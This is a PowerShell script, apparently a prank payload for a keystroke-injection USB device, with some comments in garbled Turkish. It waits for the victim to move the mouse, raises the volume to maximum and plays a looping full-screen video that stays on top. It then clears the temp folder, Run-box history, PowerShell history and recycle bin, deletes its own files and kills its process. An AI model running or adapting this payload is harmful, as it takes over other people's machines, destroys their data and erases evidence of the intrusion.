function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([System.Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        } else {
            # Sadece gerekli oldu�unda CAPSLOCK tu�una basmak i�in ek kontrol
            if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock') -eq $false) {
                $o.SendKeys("{CAPSLOCK}")
            }
            Start-Sleep -Seconds $pauseTime
        }
    }
}

#############################################################################################################################################

Function Set-Volume {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0, 100)]
        [Int]
        $volume
    )

    # Calculate number of key presses.
    $keyPresses = [Math]::Ceiling($volume / 2)

    # Create the Windows Shell object.
    $obj = New-Object -ComObject WScript.Shell

    # Set volume to zero.
    1..50 | ForEach-Object { $obj.SendKeys([char]174) }

    # Set volume to specified level.
    for ($i = 0; $i -lt $keyPresses; $i++) {
        $obj.SendKeys([char]175)
    }
}

#############################################################################################################################################

# WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

# XAML File of WPF as windows for playing movie
[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" >
        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop" />
</Window>
"@

# Movie Path
[uri]$VideoSource = "C:\js\js\1.mp4"

# Device All Objects on XAML
$XAMLReader = (New-Object System.Xml.XmlNodeReader $XAML)
$Window = [Windows.Markup.XamlReader]::Load($XAMLReader)
$VideoPlayer = $Window.FindName("VideoPlayer")

# Video Default Setting
$VideoPlayer.Volume = 100
$VideoPlayer.Source = $VideoSource

# Set volume before playing the video
Set-Volume 100

# Wait for mouse movement to trigger the next action
Target-Comes

# Loop video by resetting its position when it ends
$VideoPlayer.add_MediaEnded({
    $VideoPlayer.Position = [TimeSpan]::Zero  # Reset the position to the start
    $VideoPlayer.Play()  # Restart playing
})

$VideoPlayer.Play()

# Make sure the video player window stays on top
$Window.Topmost = $true

# Show the Window
$Window.ShowDialog() | Out-Null

# Empty temp folder
Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

# Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue

# Delete PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Ba�ka bir PowerShell oturumu ba�latarak dosya silme i�lemi ger�ekle�tirmek
Start-Process powershell -ArgumentList {
    Remove-Item -Path "C:\js.zip" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\js" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# �imdi mevcut PowerShell penceresini kapatma
Stop-Process -Id $PID -Force

